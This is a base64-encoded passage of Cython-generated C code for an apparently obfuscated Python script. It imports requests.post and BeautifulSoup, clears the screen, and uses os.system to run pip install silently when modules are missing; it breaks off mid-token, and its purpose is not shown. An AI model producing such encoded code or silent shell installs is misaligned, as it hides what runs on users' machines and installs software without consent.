X1BZWF9FUlIoMCwgNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yciwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hvaWNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20sIF9fcHl4X3RfMywgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hvaWNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jYywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAKICBfX3B5eF90XzIgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcG9zdCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMsIF9fcHl4X3RfMiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcG9zdCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHAsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCA3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXMsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5cywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzIgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgX19weXhfdF82ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xlYXJ9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfNywgJl9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2ZvbnRzLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTIsIF9fcHl4X0wyX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jZm9udHMsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxMiwgX19weXhfTDJfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5TGlzdF9QYWNrKDEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZW5kZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMywgX19weXhfTDJfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgICBfX3B5eF90XzUgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nmb250cywgX19weXhfdF8zLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTMsIF9fcHl4X0wyX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVuZGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTMsIF9fcHl4X0wyX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZW5kZXIsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxMywgX19weXhfTDJfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgICAgIAogICAgfQogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgZ290byBfX3B5eF9MN190cnlfZW5kOwogICAgX19weXhfTDJfZXJyb3I6OwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwoKICAgIAogICAgIHsKICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzUsICZfX3B5eF90XzMsICZfX3B5eF90XzIpIDwgMCkgX19QWVhfRVJSKDAsIDE0LCBfX3B5eF9MNF9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CgogICAgICAKICAgICAgX19weXhfdF85ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTUsIF9fcHl4X0w0X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE1LCBfX3B5eF9MNF9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgX19weXhfdF82ID0gMTsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfcHl0aG9uX2Nmb250c307CiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNSwgX19weXhfTDRfZXhjZXB0X2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICB9CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBnb3RvIF9fcHl4X0wzX2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgfQoKICAgIAogICAgX19weXhfTDRfZXhjZXB0X2Vycm9yOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpOwogICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgIF9fcHl4X0wzX2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpOwogICAgX19weXhfTDdfdHJ5X2VuZDo7CiAgfQoKICAKICB7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzgsICZfX3B5eF90XzcsICZfX3B5eF90XzEpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgIHsKCiAgICAgIAogICAgICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcXVlc3RzLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTcsIF9fcHl4X0wxMF9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNywgX19weXhfTDEwX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgICAgIAogICAgfQogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgZ290byBfX3B5eF9MMTVfdHJ5X2VuZDsKICAgIF9fcHl4X0wxMF9lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwoKICAgIAogICAgIHsKICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzIsICZfX3B5eF90XzMsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDE4LCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMTEgPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMTksIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpOwogICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTksIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgIF9fcHl4X3RfNiA9IDE7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9waXBfaW5zdGFsbF9yZXF1ZXN0c307CiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICB9CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBnb3RvIF9fcHl4X0wxMV9leGNlcHRpb25faGFuZGxlZDsKICAgIH0KCiAgICAKICAgIF9fcHl4X0wxMl9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDExX2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpOwogICAgX19weXhfTDE1X3RyeV9lbmQ6OwogIH0KCiAgCiAgewogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xLCAmX19weXhfdF83LCAmX19weXhfdF84KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTsKICAgICB7CgogICAgICAKICAgICAgX19weXhfdF81ID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0JlYXV0aWZ1bFNvdXApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyMSwgX19weXhfTDE4X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iczQsIF9fcHl4X3RfNSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMThfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19weXhfdF81ID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9CZWF1dGlmdWxTb3VwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjEsIF9fcHl4X0wxOF9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQmVhdXRpZnVsU291cCwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMThfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgICAgIAogICAgfQogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgZ290byBfX3B5eF9MMjNfdHJ5X2VuZDsKICAgIF9fcHl4X0wxOF9lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwoKICAgIAogICAgIHsKICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzMsICZfX3B5eF90XzUsICZfX3B5eF90XzIpIDwgMCkgX19QWVhfRVJSKDAsIDIyLCBfX3B5eF9MMjBfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMTAgPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VS